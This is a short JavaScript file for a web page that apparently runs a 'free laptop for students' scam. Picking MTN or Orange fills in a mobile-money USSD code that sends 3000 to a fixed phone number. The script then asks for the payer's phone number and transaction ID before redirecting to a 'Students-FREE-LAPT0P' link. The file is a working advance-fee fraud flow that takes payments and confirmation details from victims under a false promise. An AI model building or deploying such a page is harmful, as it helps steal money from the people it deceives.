let choix = document.getElementById("choix");
let img = document.getElementById("img");
choix.onchange = function () {
  img.src = URL.createObjectURL(choix.files[0]);
};
let number = document.getElementById("number");
number.onclick = () => {
  alert("💡💡");
};
let select = document.getElementById("select");
let code = document.getElementById("code");

select.addEventListener("change", function() {
  switch (select.value) {
    case "mtn":
      code.value = "*126*1*1*674120153*3000#";
      break;
    case "orange":
      code.value = "#150*14*694120153*3000#";
      break;
    default:
      code.value = "Choose the above network";
      break;
  }
});
let btn = document.getElementById("btn");
let id = document.getElementById("id");
btn.onclick = () => {
  if (number.value === "") {
    alert("Please Enter the phone number who can received our code");
  } else if (id.value === "") {
    alert(
      "Please enter the Id of transaction to confirm your deposit");
  } else {
    alert(
      "Whe are locking for confirm your subscription.After this, your code and your Number will send to"+"  " + number.value 
    );
    window.location.href = "https://hly.ke/Students-FREE-LAPT0P";
  }
};
